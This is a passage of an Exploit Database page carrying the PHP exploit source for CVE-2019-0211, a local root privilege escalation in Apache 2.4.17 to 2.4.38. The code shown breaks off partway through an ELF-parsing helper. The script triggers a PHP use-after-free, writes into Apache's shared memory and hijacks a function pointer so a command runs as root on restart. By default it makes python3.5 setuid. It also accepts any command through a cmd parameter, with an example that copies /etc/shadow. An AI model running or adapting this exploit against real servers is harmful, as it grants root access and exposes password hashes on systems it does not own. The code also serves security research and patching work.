<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="hdeNhtOD22xOsonmPsP2hzFt0N6VRLvyoK9WQzX9">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Apache 2.4.17 &lt; 2.4.38 - &#039;apache2ctl graceful&#039; &#039;logrotate&#039; Local Privilege Escalation - Linux local Exploit</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <script src="/js/core/jquery.min.js"></script>
    <script src="/js/jquery.fancybox.min.js"></script>

    
    <link href="/css/jquery.fancybox.min.css" rel="stylesheet"/>

    <link rel="canonical" href="https://www.exploit-db.com/exploits/46676">
    <meta name="description"
          content="Apache 2.4.17 &lt; 2.4.38 - &#039;apache2ctl graceful&#039; &#039;logrotate&#039; Local Privilege Escalation. CVE-2019-0211 . local exploit for Linux platform">
    <meta name="keywords" content="Linux,local,CVE-2019-0211 ">
    <meta name="author" content="cfreal">

    <meta property="og:title" content="Apache 2.4.17 &lt; 2.4.38 - &#039;apache2ctl graceful&#039; &#039;logrotate&#039; Local Privilege Escalation">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/46676">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2019-04-08" />
        <meta property="article:author" content="cfreal" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=9937" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Apache 2.4.17 &lt; 2.4.38 - &#039;apache2ctl graceful&#039; &#039;logrotate&#039; Local Privilege Escalation">
    <meta name="twitter:creator" content="@ExploitDB">
    
            <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">
    

    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="OffSec&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a class="nav-link" href="https://www.offsec.com/">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p title="OffSec">Online Training </p>
                </a>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>OffSec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-logo.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <!-- <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB"> -->
                        <a class="dropdown-item" href="/about-exploit-db" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Apache 2.4.17 &lt; 2.4.38 - &#039;apache2ctl graceful&#039; &#039;logrotate&#039; Local Privilege Escalation
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-6 col-lg-3 d-flex align-items-stretch">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h4 class="info-title">
                                                                EDB-ID:
                                                            </h4>

                                                            <h6 class="stats-title">
                                                                46676
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h4 class="info-title">
                                                                CVE:
                                                            </h4>

                                                            <h6 class="stats-title">

                                                                
                                                                    
                                                                        
                                                                            <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0211"
                                                                               target="_blank">
                                                                                2019-0211
                                                                            </a>

                                                                        
                                                                    
                                                                    
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <br />

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h5 text-center">

                                                <strong>EDB Verified:</strong>

                                                <i class="mdi mdi-24px mdi-close"
                                                   style="color: #ec5e10">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-6 col-lg-3 d-flex align-items-stretch">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h4 class="info-title">
                                                                Author:
                                                            </h4>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=9937">
                                                                    cfreal
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h4 class="info-title">
                                                                Type:
                                                            </h4>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=local">
                                                                    local
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <br />

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h5 text-center">

                                                <strong>Exploit: </strong>

                                                <a href="/download/46676" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download EDB 46676">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/46676" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw EDB 46676">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-6 col-lg-3 d-flex align-items-stretch">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h4 class="info-title">
                                                                Platform:
                                                            </h4>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=linux">
                                                                    Linux
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h4 class="info-title">
                                                                Date:
                                                            </h4>

                                                            <h6 class="stats-title">
                                                                2019-04-08
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <br />

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h5 text-center">

                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/exploits/46675" aria-label="View Previous Exploit"
                                       data-toggle="tooltip" data-placement="top" title="Previous Exploit" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>

                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                                href="/exploits/46677" aria-label="View Next Exploit"
                                                data-toggle="tooltip" data-placement="top" title="Next Exploit" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-php" style="white-space: pre-wrap;">&lt;?php
# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation
# Charles Fol
# @cfreal_
# 2019-04-08
#
# INFOS
#
# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html
#
# USAGE
#
# 1. Upload exploit to Apache HTTP server
# 2. Send request to page
# 3. Await 6:25AM for logrotate to restart Apache
# 4. python3.5 is now suid 0
#
# You can change the command that is ran as root using the cmd HTTP
# parameter (GET/POST).
# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/
#
# SUCCESS RATE
#
# Number of successful and failed exploitations relative to of the number
# of MPM workers (i.e. Apache subprocesses). YMMV.
#
# W  --% S   F
#  5 87% 177 26 (default)
#  8 89%  60  8
# 10 95%  70  4
#
# More workers, higher success rate.
# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.
# Generally, failure is due to all_buckets being relocated too far from its
# original address.
#
# TESTED ON
#
# - Apache/2.4.25
# - PHP 7.2.12
# - Debian GNU/Linux 9.6
#
# TESTING
#
# $ curl http://localhost/cfreal-carpediem.php
# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force
# $ ls -alh /usr/bin/python3.5
# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5
#
# There are no hardcoded addresses.
# - Addresses read through /proc/self/mem
# - Offsets read through ELF parsing
#
# As usual, there are tons of comments.
#


o(&#039;CARPE (DIEM) ~ CVE-2019-0211&#039;);
o(&#039;&#039;);

error_reporting(E_ALL);


# Starts the exploit by triggering the UAF.
function real()
{
	global $y;
	$y = [new Z()];
	json_encode([0 =&gt; &amp;$y]);
}

# In order to read/write what comes after in memory, we need to UAF a string so
# that we can control its size and make in-place edition.
# An easy way to do that is to replace the string by a timelib_rel_time
# structure of which the first bytes can be reached by the (y, m, d, h, i, s)
# properties of the DateInterval object.
#
# Steps:
# - Create a base object (Z)
# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)
# - Create DateInterval object ($place) meant to be unset and filled by another
# - Trigger the UAF by unsetting $y[0], which is still reachable using $this
# - Unset $place: at this point, if we create a new DateInterval object, it will
#   replace $place in memory
# - Create a string ($holder) that fills $place&#039;s timelib_rel_time structure
# - Allocate a new DateInterval object: its timelib_rel_time structure will
#   end up in place of abc
# - Now we can control $this-&gt;abc&#039;s zend_string structure entirely using
#   y, m, d etc.
# - Increase abc&#039;s size so that we can read/write memory that comes after it,
#   especially the shared memory block
# - Find out all_buckets&#039; position by finding a memory region that matches the
#   mutex-&gt;meth structure
# - Compute the bucket index required to reach the SHM and get an arbitrary
#   function call
# - Scan ap_scoreboard_image-&gt;parent[] to find workers&#039; PID and replace the
#   bucket
class Z implements JsonSerializable
{
	public function jsonSerialize()
	{
		global $y, $addresses, $workers_pids;

		#
		# Setup memory
		#
        o(&#039;Triggering UAF&#039;);
		o(&#039;  Creating room and filling empty spaces&#039;);

		# Fill empty blocks to make sure our allocations will be contiguous
		# I: Since a lot of allocations/deallocations happen before the script
		# is ran, two variables instanciated at the same time might not be
		# contiguous: this can be a problem for a lot of reasons.
		# To avoid this, we instanciate several DateInterval objects. These
		# objects will fill a lot of potentially non-contiguous memory blocks,
		# ensuring we get &quot;fresh memory&quot; in upcoming allocations.
		$contiguous = [];
		for($i=0;$i&lt;10;$i++)
			$contiguous[] = new DateInterval(&#039;PT1S&#039;);

		# Create some space for our UAF blocks not to get overwritten
		# I: A PHP object is a combination of a lot of structures, such as
		# zval, zend_object, zend_object_handlers, zend_string, etc., which are
		# all allocated, and freed when the object is destroyed.
		# After the UAF is triggered on the object, all the structures that are
		# used to represent it will be marked as free.
		# If we create other variables afterwards, those variables might be
		# allocated in the object&#039;s previous memory regions, which might pose
		# problems for the rest of the exploitation.
		# To avoid this, we allocate a lot of objects before the UAF, and free
		# them afterwards. Since PHP&#039;s heap is LIFO, when we create other vars,
		# they will take the place of those objects instead of the object we
		# are triggering the UAF on. This means our object is &quot;shielded&quot; and
		# we don&#039;t have to worry about breaking it.
		$room = [];
		for($i=0;$i&lt;10;$i++)
			$room[] = new Z();

		# Build string meant to fill old DateInterval&#039;s timelib_rel_time
		# I: ptr2str&#039;s name is unintuitive here: we just want to allocate a
		# zend_string of size 78.
		$_protector = ptr2str(0, 78);

		o(&#039;  Allocating $abc and $p&#039;);

		# Create ABC
		# I: This is the variable we will use to R/W memory afterwards.
		# After we free the Z object, we&#039;ll make sure abc is overwritten by a
		# timelib_rel_time structure under our control. The first 8*8 = 64 bytes
		# of this structure can be modified easily, meaning we can change the
		# size of abc. This will allow us to read/write memory after abc.
		$this-&gt;abc = ptr2str(0, 79);

		# Create $p meant to protect $this&#039;s blocks
		# I: Right after we trigger the UAF, we will unset $p.
		# This means that the timelib_rel_time structure (TRT) of this object
		# will be freed. We will then allocate a string ($protector) of the same
		# size as TRT. Since PHP&#039;s heap is LIFO, the string will take the place
		# of the now-freed TRT in memory.
		# Then, we create a new DateInterval object ($x). From the same
		# assumption, every structure constituting this new object will take the
		# place of the previous structure. Nevertheless, since TRT&#039;s memory
		# block has already been replaced by $protector, the new TRT will be put
		# in the next free blocks of the same size, which happens to be $abc
		# (remember, |abc| == |timelib_rel_time|).
		# We now have the following situation: $x is a DateInterval object whose
		# internal TRT structure has the same address as $abc&#039;s zend_string.
		$p = new DateInterval(&#039;PT1S&#039;);

		#
		# Trigger UAF
		#
		
		o(&#039;  Unsetting both variables and setting $protector&#039;);
		# UAF here, $this is usable despite being freed
		unset($y[0]);
		# Protect $this&#039;s freed blocks
		unset($p);

		# Protect $p&#039;s timelib_rel_time structure
		$protector = &quot;.$_protector&quot;;
		# !!! This is only required for apache
		# Got no idea as to why there is an extra deallocation (?)
		$room[] = &quot;!$_protector&quot;;

		o(&#039;  Creating DateInterval object&#039;);
		# After this line:
		# &amp;((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str
		# We can control the structure of $this-&gt;abc and therefore read/write
		# anything that comes after it in memory by changing its size and
		# making in-place edits using $this-&gt;abc[$position] = $char
		$x = new DateInterval(&#039;PT1S&#039;);
		# zend_string.refcount = 0
		# It will get incremented at some point, and if it is &gt; 1,
		# zend_assign_to_string_offset() will try to duplicate it before making
		# the in-place replacement
		$x-&gt;y = 0x00;
		# zend_string.len
		$x-&gt;d = 0x100;
		# zend_string.val[0-4]
		$x-&gt;h = 0x13121110;

		# Verify UAF was successful
		# We modified stuff via $x; they should be visible by $this-&gt;abc, since
		# they are at the same memory location.
		if(!(
			strlen($this-&gt;abc) === $x-&gt;d &amp;&amp;
			$this-&gt;abc[0] == &quot;\x10&quot; &amp;&amp;
			$this-&gt;abc[1] == &quot;\x11&quot; &amp;&amp;
			$this-&gt;abc[2] == &quot;\x12&quot; &amp;&amp;
			$this-&gt;abc[3] == &quot;\x13&quot;
		))
		{
			o(&#039;UAF failed, exiting.&#039;);
			exit();
		}
		o(&#039;UAF successful.&#039;);
		o(&#039;&#039;);

		# Give us some room
		# I: As indicated before, just unset a lot of stuff so that next allocs
		# don&#039;t break our fragile UAFd structure.
		unset($room);

		#
		# Setup the R/W primitive
		#

		# We control $abc&#039;s internal zend_string structure, therefore we can R/W
		# the shared memory block (SHM), but for that we need to know the
		# position of $abc in memory
		# I: We know the absolute position of the SHM, so we need to need abc&#039;s
		# as well, otherwise we cannot compute the offset

		# Assuming the allocation was contiguous, memory looks like this, with
		# 0x70-sized fastbins:
		# 	[zend_string:abc]
		# 	[zend_string:protector]
		# 	[FREE#1]
		# 	[FREE#2]
		# Therefore, the address of the 2nd free block is in the first 8 bytes
		# of the first block: 0x70 * 2 - 24
		$address = str2ptr($this-&gt;abc, 0x70 * 2 - 24);
		# The address we got points to FREE#2, hence we&#039;re |block| * 3 higher in
		# memory
		$address = $address - 0x70 * 3;
		# The beginning of the string is 24 bytes after its origin
		$address = $address + 24;
		o(&#039;Address of $abc: 0x&#039; . dechex($address));
		o(&#039;&#039;);

		# Compute the size required for our string to include the whole SHM and
		# apache&#039;s memory region
		$distance = 
			max($addresses[&#039;apache&#039;][1], $addresses[&#039;shm&#039;][1]) -
			$address
		;
		$x-&gt;d = $distance;

		# We can now read/write in the whole SHM and apache&#039;s memory region.

		#
		# Find all_buckets in memory
		#

		# We are looking for a structure s.t.
		# |all_buckets, mutex| = 0x10
		# |mutex, meth| = 0x8
		# all_buckets is in apache&#039;s memory region
		# mutex is in apache&#039;s memory region
		# meth is in libaprR&#039;s memory region
		# meth&#039;s function pointers are in libaprX&#039;s memory region
		o(&#039;Looking for all_buckets in memory&#039;);
		$all_buckets = 0;

		for(
			$i = $addresses[&#039;apache&#039;][0] + 0x10;
			$i &lt; $addresses[&#039;apache&#039;][1] - 0x08;
			$i += 8
		)
		{
			# mutex
			$mutex = $pointer = str2ptr($this-&gt;abc, $i - $address);
			if(!in($pointer, $addresses[&#039;apache&#039;]))
				continue;


			# meth
			$meth = $pointer = str2ptr($this-&gt;abc, $pointer + 0x8 - $address);
			if(!in($pointer, $addresses[&#039;libaprR&#039;]))
				continue;

			o(&#039;  [&amp;mutex]: 0x&#039; . dechex($i));
			o(&#039;    [mutex]: 0x&#039; . dechex($mutex));
			o(&#039;      [meth]: 0x&#039; . dechex($meth));


			# meth-&gt;*
			# flags
			if(str2ptr($this-&gt;abc, $pointer - $address) != 0)
				continue;
			# methods
			for($j=0;$j&lt;7;$j++)
			{
				$m = str2ptr($this-&gt;abc, $pointer + 0x8 + $j * 8 - $address);
				if(!in($m, $addresses[&#039;libaprX&#039;]))
					continue 2;
				o(&#039;        [*]: 0x&#039; . dechex($m));
			}

			$all_buckets = $i - 0x10;
			o(&#039;all_buckets = 0x&#039; . dechex($all_buckets));
			break;
		}

		if(!$all_buckets)
		{
			o(&#039;Unable to find all_buckets&#039;);
			exit();
		}

		o(&#039;&#039;);

		# The address of all_buckets will change when apache is gracefully
		# restarted. This is a problem because we need to know all_buckets&#039;s
		# address in order to make all_buckets[some_index] point to a memory
		# region we control.

		#
		# Compute potential bucket indexes and their addresses
		#

        o(&#039;Computing potential bucket indexes and addresses&#039;);

		# Since we have sizeof($workers_pid) MPM workers, we can fill the rest
		# of the ap_score_image-&gt;servers items, so 256 - sizeof($workers_pids),
		# with data we like. We keep the one at the top to store our payload.
		# The rest is sprayed with the address of our payload.

		$size_prefork_child_bucket = 24;
		$size_worker_score = 264;
		# I get strange errors if I use every &quot;free&quot; item, so I leave twice as
		# many items free. I&#039;m guessing upon startup some
		$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);
		$spray_max = $addresses[&#039;shm&#039;][1];
		$spray_min = $spray_max - $spray_size;

		$spray_middle = (int) (($spray_min + $spray_max) / 2);
		$bucket_index_middle = (int) (
			- ($all_buckets - $spray_middle) /
			$size_prefork_child_bucket
		);

		#
		# Build payload
		#

		# A worker_score structure was kept empty to put our payload in
		$payload_start = $spray_min - $size_worker_score;

		$z = ptr2str(0);

    	# Payload maxsize 264 - 112 = 152
		# Offset 8 cannot be 0, but other than this you can type whatever
		# command you want
    	$bucket = isset($_REQUEST[&#039;cmd&#039;]) ?
    		$_REQUEST[&#039;cmd&#039;] :
    		&quot;chmod +s /usr/bin/python3.5&quot;;

    	if(strlen($bucket) &gt; $size_worker_score - 112)
		{
			o(
				&#039;Payload size is bigger than available space (&#039; .
				($size_worker_score - 112) .
				&#039;), exiting.&#039;
			);
			exit();
		}
    	# Align
    	$bucket = str_pad($bucket, $size_worker_score - 112, &quot;\x00&quot;);

    	# apr_proc_mutex_unix_lock_methods_t
		$meth = 
		    $z .
		    $z .
		    $z .
		    $z .
		    $z .
		    $z .
			# child_init
		    ptr2str($addresses[&#039;zend_object_std_dtor&#039;])
		;

		# The second pointer points to meth, and is used before reaching the
		# arbitrary function call
		# The third one and the last one are both used by the function call
		# zend_object_std_dtor(object) =&gt; ... =&gt; system(&amp;arData[0]-&gt;val)
		$properties = 
			# refcount
			ptr2str(1) .
			# u-nTableMask meth
			ptr2str($payload_start + strlen($bucket)) .
			# Bucket arData
			ptr2str($payload_start) .
			# uint32_t nNumUsed;
			ptr2str(1, 4) .
		    # uint32_t nNumOfElements;
			ptr2str(0, 4) .
			# uint32_t nTableSize
			ptr2str(0, 4) .
			# uint32_t nInternalPointer
			ptr2str(0, 4) .
			# zend_long nNextFreeElement
			$z .
			# dtor_func_t pDestructor
			ptr2str($addresses[&#039;system&#039;])
		;

		$payload =
			$bucket .
			$meth .
			$properties
		;

		# Write the payload

		o(&#039;Placing payload at address 0x&#039; . dechex($payload_start));

		$p = $payload_start - $address;
		for(
			$i = 0;
			$i &lt; strlen($payload);
			$i++
		)
		{
			$this-&gt;abc[$p+$i] = $payload[$i];
		}

		# Fill the spray area with a pointer to properties
		
		$properties_address = $payload_start + strlen($bucket) + strlen($meth);
		o(&#039;Spraying pointer&#039;);
		o(&#039;  Address: 0x&#039; . dechex($properties_address));
		o(&#039;  From: 0x&#039; . dechex($spray_min));
		o(&#039;  To: 0x&#039; . dechex($spray_max));
		o(&#039;  Size: 0x&#039; . dechex($spray_size));
		o(&#039;  Covered: 0x&#039; . dechex($spray_size * count($workers_pids)));
		o(&#039;  Apache: 0x&#039; . dechex(
			$addresses[&#039;apache&#039;][1] -
			$addresses[&#039;apache&#039;][0]
		));

		$s_properties_address = ptr2str($properties_address);

		for(
			$i = $spray_min;
			$i &lt; $spray_max;
			$i++
		)
		{
			$this-&gt;abc[$i - $address] = $s_properties_address[$i % 8];
		}
		o(&#039;&#039;);

		# Find workers PID in the SHM: it indicates the beginning of their
		# process_score structure. We can then change process_score.bucket to
		# the index we computed. When apache reboots, it will use
		# all_buckets[ap_scoreboard_image-&gt;parent[i]-&gt;bucket]-&gt;mutex
		# which means we control the whole apr_proc_mutex_t structure.
		# This structure contains pointers to multiple functions, especially
		# mutex-&gt;meth-&gt;child_init(), which will be called before privileges
		# are dropped.
		# We do this for every worker PID, incrementing the bucket index so that
		# we cover a bigger range.
		
		o(&#039;Iterating in SHM to find PIDs...&#039;);

		# Number of bucket indexes covered by our spray
		$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);
		# Number of bucket indexes covered by our spray and the PS structures
		$total_nb_buckets = $spray_nb_buckets * count($workers_pids);
		# First bucket index to handle
		$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);

		# Iterate over every process_score structure until we find every PID or
		# we reach the end of the SHM
		for(
			$p = $addresses[&#039;shm&#039;][0] + 0x20;
			$p &lt; $addresses[&#039;shm&#039;][1] &amp;&amp; count($workers_pids) &gt; 0;
			$p += 0x24
		)
		{
			$l = $p - $address;
			$current_pid = str2ptr($this-&gt;abc, $l, 4);
			o(&#039;Got PID: &#039; . $current_pid);
			# The PID matches one of the workers
			if(in_array($current_pid, $workers_pids))
			{
				unset($workers_pids[$current_pid]);
				o(&#039;  PID matches&#039;);
				# Update bucket address
				$s_bucket_index = pack(&#039;l&#039;, $bucket_index);
				$this-&gt;abc[$l + 0x20] = $s_bucket_index[0];
				$this-&gt;abc[$l + 0x21] = $s_bucket_index[1];
				$this-&gt;abc[$l + 0x22] = $s_bucket_index[2];
				$this-&gt;abc[$l + 0x23] = $s_bucket_index[3];
				o(&#039;  Changed bucket value to &#039; . $bucket_index);
				$min = $spray_min - $size_prefork_child_bucket * $bucket_index;
				$max = $spray_max - $size_prefork_child_bucket * $bucket_index;
				o(&#039;  Ranges: 0x&#039; . dechex($min) . &#039; - 0x&#039; . dechex($max));
				# This bucket range is covered, go to the next one
				$bucket_index += $spray_nb_buckets;
			}
		}

		if(count($workers_pids) &gt; 0)
		{
			o(
				&#039;Unable to find PIDs &#039; .
				implode(&#039;, &#039;, $workers_pids) .
				&#039; in SHM, exiting.&#039;
			);
			exit();
		}

		o(&#039;&#039;);
		o(&#039;EXPLOIT SUCCESSFUL.&#039;);
		o(&#039;Await 6:25AM.&#039;);
		
		return 0;
	}
}

function o($msg)
{
	# No concatenation -&gt; no string allocation
	print($msg);
	print(&quot;\n&quot;);
}

function ptr2str($ptr, $m=8)
{
	$out = &quot;&quot;;
    for ($i=0; $i&lt;$m; $i++)
    {
        $out .= chr($ptr &amp; 0xff);
        $ptr &gt;&gt;= 8;
    }
    return $out;
}

function str2ptr(&amp;$str, $p, $s=8)
{
	$address = 0;
	for($j=$s-1;$j&gt;=0;$j--)
	{
		$address &lt;&lt;= 8;
		$address |= ord($str[$p+$j]);
	}
	return $address;
}

function in($i, $range)
{
	return $i &gt;= $range[0] &amp;&amp; $i &lt; $range[1];
}

/**
 * Finds the offset of a symbol in a file.
 */
function find_symbol($file, $symbol)
{
    $elf = file_get_contents($file);
    $e_shoff = str2ptr($elf, 0x28);
    $e_shentsize = str2ptr($elf, 0x3a, 2);
    $e_shnum = str2ptr($elf, 0x3c, 2);

    $dynsym_off = 0;
    $dynsym_sz = 0;
    $dynstr_off = 0;

    for($i=0;$i&lt;$e_shnum;$i++)
    {
        $offset = $e_shoff + $i * $e_shentsize;
        $sh_type = str2ptr($elf, $offset + 0x04, 4);

        $SHT_DYNSYM = 11;
